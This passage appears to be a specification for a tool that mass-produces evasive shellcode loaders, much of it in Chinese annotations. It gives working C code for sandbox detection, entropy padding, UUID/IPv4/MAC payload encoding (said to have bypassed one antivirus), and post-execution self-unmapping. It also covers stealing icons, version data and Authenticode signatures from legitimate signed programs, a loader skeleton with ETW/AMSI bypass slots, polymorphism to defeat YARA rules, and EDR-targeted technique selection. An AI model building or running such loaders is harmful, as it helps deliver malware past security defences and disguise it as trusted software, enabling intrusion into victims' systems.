if (pGMSE(&msx) && msx.ullTotalPhys < 2147483648ULL) return 0; // < 2GB RAM = likely sandbox
```

#### Delayed Execution
```c
// PLACEHOLDER_DELAY
typedef long (__stdcall *tNtDelayExecution)(unsigned char, void*);
tNtDelayExecution pNDE = (tNtDelayExecution)ResolveApi(HASH_NTDLL, HASH_NtDelayExecution);
long long delay = -((long long)(30 + (__rdtsc() % 30)) * 10000000LL); // 30-60s random
pNDE(0, &delay);
```

#### API Hammering
```c
// PLACEHOLDER_HAMMER
typedef unsigned long (__stdcall *tGetTickCount)(void);
tGetTickCount pGTC = (tGetTickCount)ResolveApi(HASH_KERNEL32, HASH_GetTickCount);
for (volatile unsigned long i = 0; i < 10000000; i++) pGTC();
```

#### Process Count Check (sandbox 通常 < 40 进程)
```c
// PLACEHOLDER_ANTI_SANDBOX_PROCCOUNT
typedef long (__stdcall *tNtQSI)(unsigned long, void*, unsigned long, unsigned long*);
tNtQSI pNtQSI = (tNtQSI)ResolveApi(HASH_NTDLL, HASH_NtQuerySystemInformation);
unsigned char buf[1024 * 256];
unsigned long retLen = 0;
pNtQSI(5/*SystemProcessInformation*/, buf, sizeof(buf), &retLen);
int procCount = 0;
unsigned char* ptr = buf;
while (1) {
    procCount++;
    unsigned long nextOffset = *(unsigned long*)ptr;
    if (!nextOffset) break;
    ptr += nextOffset;
}
if (procCount < 40) return 0; // sandbox: too few processes
```

#### Username / Computer Name Blacklist
```c
// PLACEHOLDER_ANTI_SANDBOX_USERNAME
typedef int (__stdcall *tGetUserNameA)(char*, unsigned long*);
tGetUserNameA pGUNA = (tGetUserNameA)ResolveApiSafe(HASH_ADVAPI32, HASH_GetUserNameA);
char uname[64] = {0};
unsigned long ulen = 64;
pGUNA(uname, &ulen);
// Blacklist: known sandbox/analyst usernames
const char* bl[] = {
    "John","john","user","admin","sandbox","malware","virus","test",
    "sample","analyst","CurrentUser","Emily","Anna","SANDBOX","USER", 0
};
for (int i = 0; bl[i]; i++) {
    const char* a = uname; const char* b = bl[i]; int match = 1;
    while (*a && *b) { if (*a++ != *b++) { match = 0; break; } }
    if (match && !*b) return 0; // matched blacklisted name
}
```

#### System Uptime Check (sandbox 通常 uptime < 10 分钟)
```c
// PLACEHOLDER_ANTI_SANDBOX_UPTIME
typedef unsigned long long (__stdcall *tGetTickCount64)(void);
tGetTickCount64 pGTC64 = (tGetTickCount64)ResolveApi(HASH_KERNEL32, HASH_GetTickCount64);
if (pGTC64() < 600000ULL) return 0; // < 10 minutes uptime = likely sandbox
```

#### Cursor Movement Check (sandbox 无真实用户操作)
```c
// PLACEHOLDER_ANTI_SANDBOX_CURSOR
typedef struct { long x; long y; } POINT_S;
typedef int (__stdcall *tGetCursorPos)(POINT_S*);
tGetCursorPos pGCP = (tGetCursorPos)ResolveApiSafe(HASH_USER32, HASH_GetCursorPos);
POINT_S p1 = {0}, p2 = {0};
pGCP(&p1);
typedef long (__stdcall *tNtDE)(unsigned char, void*);
tNtDE pNDE = (tNtDE)ResolveApi(HASH_NTDLL, HASH_NtDelayExecution);
long long wait = -20000000LL; // 2 seconds
pNDE(0, &wait);
pGCP(&p2);
if (p1.x == p2.x && p1.y == p2.y) return 0; // no mouse movement = sandbox
```

#### Screen Resolution Check (sandbox 低分辨率)
```c
// PLACEHOLDER_ANTI_SANDBOX_SCREEN
typedef int (__stdcall *tGetSystemMetrics)(int);
tGetSystemMetrics pGSM = (tGetSystemMetrics)ResolveApiSafe(HASH_USER32, HASH_GetSystemMetrics);
int cx = pGSM(0); // SM_CXSCREEN
int cy = pGSM(1); // SM_CYSCREEN
if (cx < 1200 || cy < 800) return 0; // low resolution = likely sandbox
```

#### Recent Files Check (sandbox 无用户文件)
```c
// PLACEHOLDER_ANTI_SANDBOX_RECENT
typedef void* (__stdcall *tFindFirstFileA)(const char*, void*);
typedef int (__stdcall *tFindNextFileA)(void*, void*);
typedef int (__stdcall *tFindClose)(void*);
tFindFirstFileA pFFF = (tFindFirstFileA)ResolveApi(HASH_KERNEL32, HASH_FindFirstFileA);
tFindNextFileA pFNF = (tFindNextFileA)ResolveApi(HASH_KERNEL32, HASH_FindNextFileA);
tFindClose pFC = (tFindClose)ResolveApi(HASH_KERNEL32, HASH_FindClose);
// Build path to Recent folder: %APPDATA%\Microsoft\Windows\Recent\*
typedef unsigned long (__stdcall *tGetEnvironmentVariableA)(const char*, char*, unsigned long);
tGetEnvironmentVariableA pGEVA = (tGetEnvironmentVariableA)ResolveApi(HASH_KERNEL32, HASH_GetEnvironmentVariableA);
char envVar[] = {'A','P','P','D','A','T','A',0};
char recent[260];
__stosb((unsigned char*)recent, 0, 260);
unsigned long envLen = pGEVA(envVar, recent, 200);
if (envLen == 0 || envLen > 200) return 0;
// Append \Microsoft\Windows\Recent\*
char suffix[] = {'\\','M','i','c','r','o','s','o','f','t','\\','W','i','n','d','o','w','s','\\','R','e','c','e','n','t','\\','*',0};
for (unsigned long i = 0; suffix[i]; i++) recent[envLen + i] = suffix[i];
recent[envLen + 27] = 0;
unsigned char findData[592]; // WIN32_FIND_DATAA
void* hFind = pFFF(recent, findData);
int fileCount = 0;
if ((long long)hFind != -1) {
    do { fileCount++; } while (pFNF(hFind, findData));
    pFC(hFind);
}
if (fileCount < 5) return 0; // empty Recent = likely sandbox
```

> **Integration**: 当 `sandbox` 选项启用时, 从以上 10+ 检查中随机选择 3-4 个组合。
> 不要全部使用 — 每个 loader 使用不同子集提供多样性。

---

### Dimension 7: Entropy Reduction

#### English Text Padding
```c
// PLACEHOLDER_ENTROPY_TEXT
// Embed in .rdata section to lower overall entropy
#pragma section(".pad", read)
__declspec(allocate(".pad")) const char padding[] =
    "The quick brown fox jumps over the lazy dog. "
    "Lorem ipsum dolor sit amet, consectetur adipiscing elit. "
    "Windows is a registered trademark of Microsoft Corporation. "
    "This application requires Windows 10 or later to function properly. "
    "Please ensure all system requirements are met before installation. "
    "For technical support, please contact your system administrator. "
    /* repeat ~4KB of natural English text to bring entropy below 6.5 */;
```

#### Dictionary Word Array
```c
// PLACEHOLDER_ENTROPY_DICT
#pragma section(".dict", read)
__declspec(allocate(".dict")) const char* words[] = {
    "system", "process", "thread", "memory", "kernel", "driver",
    "service", "network", "socket", "buffer", "handle", "module",
    /* ... 200+ common English words ... */
};
```

---

### Dimension 8: Payload Encoding

> Encoding transforms shellcode bytes into string arrays (UUID, IPv4, MAC).
> Applied AFTER encryption: encrypt → encode → store as string array.
> At runtime: decode string array → decrypt → execute.
> 主要优势: 大幅降低熵值 (UUID ~4.7), 避免高熵检测, 绕过简单的字节模式匹配.
> Proven: UUID encoding bypassed Huorong (entropy 4.714, 2026-05-07).

#### UUID String Array (16 bytes per UUID) ★ EDR Tested
```c
// PLACEHOLDER_ENCODE_UUID
// Build-time: convert encrypted payload to UUID strings
// Each UUID = 16 bytes: "XXXXXXXX-XXXX-XXXX-XXXX-XXXXXXXXXXXX"
// Pad last chunk with random bytes to align to 16

// Runtime decode via UuidFromStringA (rpcrt4.dll)
typedef long (__stdcall *tUuidFromStringA)(const char*, void*);
// rpcrt4.dll is loaded by default in most processes

// Build-time generation (Python):
// import uuid
// for i in range(0, len(enc_payload), 16):
//     chunk = enc_payload[i:i+16].ljust(16, b'\x00')
//     u = uuid.UUID(bytes_le=chunk)
//     print(f'    "{u}",')

// Example encoded payload:
const char* uuids[] = {
    "e48348fc-e8f0-00c0-0000-415141505251",
    "d2314856-4865-528b-6048-8b5218488b52",
    // ... one UUID per 16 bytes of encrypted shellcode ...
};
const unsigned long uuid_count = sizeof(uuids) / sizeof(uuids[0]);

// Runtime decode:
typedef long (__stdcall *tUuidFromStringA)(const char*, void*);
tUuidFromStringA pUuid = (tUuidFromStringA)ResolveApiSafe(HASH_RPCRT4, HASH_UuidFromStringA);
// UuidFromStringA is in rpcrt4.dll — resolved via EnsureModule (LoadLibraryA fallback)

unsigned char* pDecoded = (unsigned char*)pMem; // pre-allocated RW buffer
for (unsigned long i = 0; i < uuid_count; i++) {
    pUuid((const char*)uuids[i], pDecoded + (i * 16));
}
// pDecoded now contains the encrypted payload → decrypt → execute
```

#### IPv4 String Array (4 bytes per IP)
```c
// PLACEHOLDER_ENCODE_IPV4
// Build-time: convert 4 bytes to dotted-decimal IP string
// "192.168.1.1" = bytes 0xC0, 0xA8, 0x01, 0x01

// Build-time generation (Python):
// for i in range(0, len(enc_payload), 4):
//     chunk = enc_payload[i:i+4].ljust(4, b'\x00')
//     print(f'    "{chunk[0]}.{chunk[1]}.{chunk[2]}.{chunk[3]}",')

const char* ips[] = {
    "252.72.131.228",
    "240.232.192.0",
    // ... one IP per 4 bytes ...
};
const unsigned long ip_count = sizeof(ips) / sizeof(ips[0]);

// Runtime decode via RtlIpv4StringToAddressA (ntdll)
typedef long (__stdcall *tRtlIpv4StringToAddressA)(const char*, unsigned char, const char**, void*);
tRtlIpv4StringToAddressA pIp4 = (tRtlIpv4StringToAddressA)ResolveApi(HASH_NTDLL, HASH_RtlIpv4StringToAddressA);

unsigned char* pDecoded = (unsigned char*)pMem;
for (unsigned long i = 0; i < ip_count; i++) {
    const char* term = 0;
    pIp4(ips[i], 0, &term, pDecoded + (i * 4));
}
```

#### MAC Address String Array (6 bytes per MAC)
```c
// PLACEHOLDER_ENCODE_MAC
// Build-time: convert 6 bytes to MAC address string
// "FC:48:83:E4:F0:E8" = first 6 bytes of shellcode

// Build-time generation (Python):
// for i in range(0, len(enc_payload), 6):
//     chunk = enc_payload[i:i+6].ljust(6, b'\x00')
//     print(f'    "{chunk[0]:02X}-{chunk[1]:02X}-{chunk[2]:02X}-{chunk[3]:02X}-{chunk[4]:02X}-{chunk[5]:02X}",')

const char* macs[] = {
    "FC-48-83-E4-F0-E8",
    "C0-00-00-00-41-51",
    // ... one MAC per 6 bytes ...
};
const unsigned long mac_count = sizeof(macs) / sizeof(macs[0]);

// Runtime decode via RtlEthernetStringToAddressA (ntdll)
typedef long (__stdcall *tRtlEthernetStringToAddressA)(const char*, const char**, void*);
tRtlEthernetStringToAddressA pMac = (tRtlEthernetStringToAddressA)ResolveApi(HASH_NTDLL, HASH_RtlEthernetStringToAddressA);

unsigned char* pDecoded = (unsigned char*)pMem;
for (unsigned long i = 0; i < mac_count; i++) {
    const char* term = 0;
    pMac(macs[i], &term, pDecoded + (i * 6));
}
```

#### No Encoding (Raw Byte Array)
```c
// PLACEHOLDER_ENCODE_NONE
// Encrypted payload stored as raw unsigned char array
unsigned char payload[] = { 0x4F, 0x2C, 0xA1, ... };
// Directly decrypt in place or to allocated memory
```

---

### Dimension 9: Post-Execution Cleanup

> Shellcode 启动后, loader 自身的内存 (key、payload 数组、解密代码) 仍可被内存扫描发现。
> Post-Execution Cleanup 在 shellcode 执行后清理 loader 痕迹。

#### None (默认)
```c
// PLACEHOLDER_CLEANUP_NONE
// 不做清理 — loader 保持 Sleep(INFINITE) 状态
// 适用于: 测试阶段、短期执行
```

#### Memory Wipe (清零关键数据)
```c
// PLACEHOLDER_CLEANUP_WIPE
// Shellcode 已通过 callback/fiber/threadpool 启动后:
// 零化 key、解密函数中的栈变量、payload 字符串数组
__stosb((unsigned char*)full_key, 0, sizeof(full_key));
// 如果 payload 是 UUID/IPv4/MAC 字符串数组:
// __stosb((unsigned char*)sc_uuids, 0, sizeof(sc_uuids));
// 如果 decoded buffer 与 exec memory 不同:
// NtFreeVirtualMemory 释放 decoded buffer
```

#### Self-Unmap (loader 从内存消失)
```c
// PLACEHOLDER_CLEANUP_UNMAP
// Shellcode 在独立的 NtAllocateVirtualMemory 区域执行
// loader 解除自身映射 — 从 VAD tree 中消失
// 最激进选项: loader EXE 在进程中完全不可见

// 1. 获取 loader 自身的 ImageBase
void* pPeb = (void*)__readgsqword(0x60);
void* imageBase = *(void**)((char*)pPeb + 0x10);

// 2. 在 shellcode 执行后 (callback/threadpool 已触发):
typedef long (__stdcall *tNtUnmapViewOfSection)(void*, void*);
tNtUnmapViewOfSection pUnmap = (tNtUnmapViewOfSection)
    ResolveApi(HASH_NTDLL, HASH_NtUnmapViewOfSection);
pUnmap((void*)-1, imageBase);
// 注意: unmap 后 loader 代码不可执行, 确保 unmap 是最后一条指令
// 使用 NtDelayExecution(INFINITE) 之前的 Sleep 已在 ntdll 中, 不受影响
```

---

## Sign Option — Signature Theft

### Flow
1. Scan `C:\Program Files\` and `C:\Program Files (x86)\` for signed EXEs
2. Select random signed EXE per loader (different source each time)
3. Extract and apply:

### Version Info (via resource manipulation)
```
FileDescription, CompanyName, ProductName, FileVersion,
ProductVersion, LegalCopyright, OriginalFilename, InternalName
```

### Icon Resource
- Extract RT_ICON + RT_GROUP_ICON from source
- Embed into compiled loader via resource compiler (.rc file)

### PE Timestamp
```c
// Modify IMAGE_FILE_HEADER.TimeDateStamp to match source EXE
// Read source PE header, copy TimeDateStamp value
```

### File Time
```powershell
# After compilation, set file times to match source
$src = Get-Item "C:\Program Files\SourceApp\app.exe"
$dst = Get-Item "loader_01.exe"
$dst.CreationTime = $src.CreationTime
$dst.LastWriteTime = $src.LastWriteTime
$dst.LastAccessTime = $src.LastAccessTime
```

### Authenticode Signature Copy
```
# Append signature from source PE's Certificate Table (overlay)
# This creates an "invalid but present" signature that passes casual inspection
# Steps:
# 1. Read source PE → find Security Directory entry (DataDirectory[4])
# 2. Read certificate data from offset
# 3. Append to target PE → update DataDirectory[4] with new offset/size
```

---

## Loader Skeleton (C/C++)

```c
// loader_template.c — assembled from technique pool selections
#include <intrin.h>
#pragma comment(linker, "/ENTRY:main")
#pragma comment(linker, "/NODEFAULTLIB")
#pragma comment(linker, "/SUBSYSTEM:CONSOLE")
#pragma comment(linker, "/MERGE:.rdata=.text")

// Force benign IAT imports
__declspec(dllimport) void __stdcall GetSystemTimeAsFileTime(void*);
__declspec(dllimport) int __stdcall QueryPerformanceCounter(void*);
__declspec(dllimport) unsigned long __stdcall GetCurrentProcessId(void);
__declspec(dllimport) int __stdcall IsProcessorFeaturePresent(unsigned long);
#pragma comment(lib, "kernel32.lib")

// [INSERT: peb_resolve.h]
// [INSERT: encoded payload (UUID/IPv4/MAC string array or raw byte array)]
// [INSERT: encryption key array]
// [INSERT: entropy padding]
// [INSERT: anti-analysis (if sandbox option)]
// [INSERT: defense evasion (ETW/AMSI bypass)]
// [INSERT: decode routine (UUID/IPv4/MAC → raw bytes)]
// [INSERT: decryption routine (XOR/AES/RC4/ChaCha20/Brute-Force)]
// [INSERT: memory allocation via indirect syscall (NtAllocateVirtualMemory)]
// [INSERT: copy payload to RW memory]
// [INSERT: flip to RX via indirect syscall (NtProtectVirtualMemory)]
// [INSERT: execution method]
// [INSERT: post-execution cleanup (Dimension 9)]

int main(void) {
    // Touch IAT imports to prevent linker removal
    void* ft; GetSystemTimeAsFileTime(&ft);
    long long pc; QueryPerformanceCounter(&pc);
    GetCurrentProcessId();
    IsProcessorFeaturePresent(0);

    // [ANTI-ANALYSIS BLOCK] (sandbox option: 随机 3-4 checks)
    // [DEFENSE EVASION BLOCK] (ETW/AMSI HBP)
    // [DECODE PAYLOAD] (UUID/IPv4/MAC → raw, or skip if raw)
    // [DECRYPT PAYLOAD] (XOR/RC4/AES/ChaCha20, or brute-force then decrypt)
    // [ALLOCATE RW MEMORY]
    // [COPY DECRYPTED PAYLOAD]
    // [CHANGE TO RX]
    // [EXECUTE] (Fiber/Callback/Mapping/Phantom/ThreadPool)
    // [POST-EXECUTION CLEANUP] (None/Wipe/Self-Unmap)
    return 0;
}
```

---

## Output Format

### README.md Template
```markdown
# Fuzz Output — [timestamp]

> Payload: [filename] ([size] bytes) | Language: [C/C++/Rust] | Count: [N]
> Options: [sign/sandbox/none]
> Diversity Score: [0.XX] ([Low/Moderate/High]) | Coverage: Encrypt [M/6], Exec [M/8], Encode [M/4], Cleanup [M/3]

## Loaders

| # | File | Execution | Encryption | Encoding | Cleanup | Evasion | Anti-Analysis | Entropy | OPSEC |
|---|------|-----------|------------|----------|---------|---------|---------------|---------|-------|
| 01 | loader_01_tpwait_xorbf_uuid | TpWait | XOR-BF | UUID | Wipe | ETW HBP | Uptime+Cursor | Text pad | 🟢 |
| 02 | loader_02_fiber_chacha20_raw | Fiber | ChaCha20 | Raw | None | AMSI HBP | ProcCount | Dict pad | 🟢 |
| ... | ... | ... | ... | ... | ... | ... | ... | ... |

---
> 信益安信息安全研究院出品 | XinYiAn Security Research Institute
```

---

## Compile-Time Polymorphism (每个 loader 强制应用)

> 不是可选维度 — 每个 loader 必须应用以下变换, 确保同一批次的 loader 在二进制层面互不相同。
> YARA 规则无法用固定变量名/函数名匹配所有 loader。

### Name Pool (随机采样)

每个 loader 生成时, 从以下池中随机采样替换所有内部标识符:

**函数名候选** (每 loader 选不同子集):
```
InitSecurityProvider, ValidateTokenChain, ProcessCertificateRequest,
UpdateRegistryPolicy, ParseConfigurationData, SyncDeviceContext,
VerifyIntegrityHash, TransformDataBuffer, AllocateServiceHandle,
RegisterEventCallback, NormalizePathString, EnumerateResourceTable,
CompressStreamBlock, DeserializePayload, AttachDebugMonitor,
FlushCacheRegion, NotifyStateChange, QuerySystemCapability,
MarshalInterfaceProxy, BindTransportLayer, ReleaseObjectReference,
InitializeWorkItem, ScheduleTimerEvent, ResolveServiceEndpoint,
ComputeChecksumValue, ValidateInputRange, SetupPipelineStage,
GenerateSessionToken, DecryptChannelData, BuildMessageFrame
```

**变量名候选**:
```
hModule, dwResult, lpBuffer, cbSize, pContext, hService,
hProvider, pbData, ulFlags, pSecurityDesc, hToken, szPath,
dwOptions, lpOverlapped, hEvent, pCallback, nRetries,
hTransaction, lpClassName, dwAccess, pAllocInfo, cbBuffer,
hCertStore, lpOutputBuffer, dwBytesRead, pWorkContext
```

**Type alias 候选前缀** (与 API 签名配对):
```
t, fn, pfn, lp, TFn, PFN_, Fn, Proc, Handler
```

### Block Reordering Rules

以下代码块可安全重排 (无数据依赖):
- API resolution 调用之间 (resolve NtAlloc vs resolve CreateEventW — 顺序无关)
- Key derivation vs memory allocation (key 不依赖 allocated memory)
- Anti-analysis checks 之间 (各检查互相独立)
- Entropy padding 位置 (section 级别, 可放在文件任意位置)

**不可重排**: decode → decrypt → alloc → copy → protect → execute (严格线性依赖)

### Junk Code Templates (每 loader 插入 3-5 个)

```c
// Template A: Dead branch (永远不执行)
if (GetCurrentProcessId() == 0) { volatile unsigned long __x = 0x5A5A5A5A; __x ^= __x; }

// Template B: Extra benign IAT call (合法噪音)
{ long long __qpc; QueryPerformanceCounter(&__qpc); }

// Template C: Arithmetic identity (编译器可能优化掉, 加 volatile)
{ volatile unsigned long __jnk = (unsigned long)__rdtsc(); __jnk = (__jnk * 1) + 0; }

// Template D: Dummy loop (随机短循环)
for (volatile int __j = 0; __j < (int)(__rdtsc() & 0x7); __j++) { }

// Template E: Stack noise (占用栈空间后释放)
{ volatile unsigned char __pad[64]; __stosb(__pad, 0xCC, 64); __stosb(__pad, 0x00, 64); }
```

---

## Diversity Scoring

> 批量生成后自动计算, 确保 loader 之间有足够差异。

### Algorithm

每个 loader 表示为技术向量: `L = [encrypt, exec, encoding, cleanup, evasion, anti_analysis, entropy]`

**Pairwise Distance** (Hamming):
```
distance(L1, L2) = count(L1[d] != L2[d] for d in dimensions) / total_dimensions
```

**Batch Diversity Score** = mean of all pairwise distances (range 0.0 ~ 1.0)

| Score | Rating | Action |
|-------|--------|--------|
| 0.0 ~ 0.3 | Low | 重新生成最相似的 loader, 强制不同技术 |
| 0.3 ~ 0.6 | Moderate | 可接受 |
| 0.6 ~ 1.0 | High | 理想 |

**Dimension Coverage**: 每个维度使用了多少种不同技术 / 该维度总选项数。
例: `Encryption 4/6, Execution 5/8, Encoding 3/4, Cleanup 2/3`

---

## EDR-Aware Weighting

> 当 description 包含 `target:<edr_name>` 时, 使用加权随机选择。

### Algorithm

1. 读取 `edr_profiles/<edr_name>/profile.md`
2. 对每个维度, 提取 "bypassed" 和 "detected" 技术
3. 赋权重:
   - **Bypassed** 技术: weight = 3 (强倾向)
   - **Untested** 技术: weight = 2 (中性, 扩展知识)
   - **Detected** 技术: weight = 0 (排除)
4. 加权随机选择
5. **第一个 loader**: 必须使用完全匹配的 bypassed 组合 (已验证公式)
6. **其余 loader**: 探索 untested 组合 (扩展 EDR 知识库)

### 与 /sandboxfuzz 联动

当 `/sandboxfuzz` 分析结果生成 `sandbox_profiles/<name>/profile.md` 后:
- `/malfuzz sandbox` 可引用 sandbox profile 中的具体阈值
- 例: 某沙箱 RAM = 1024MB, 则 Anti-VM RAM 阈值设为 1500MB (高于沙箱)
- 某沙箱 username = "John Doe", 则加入黑名单
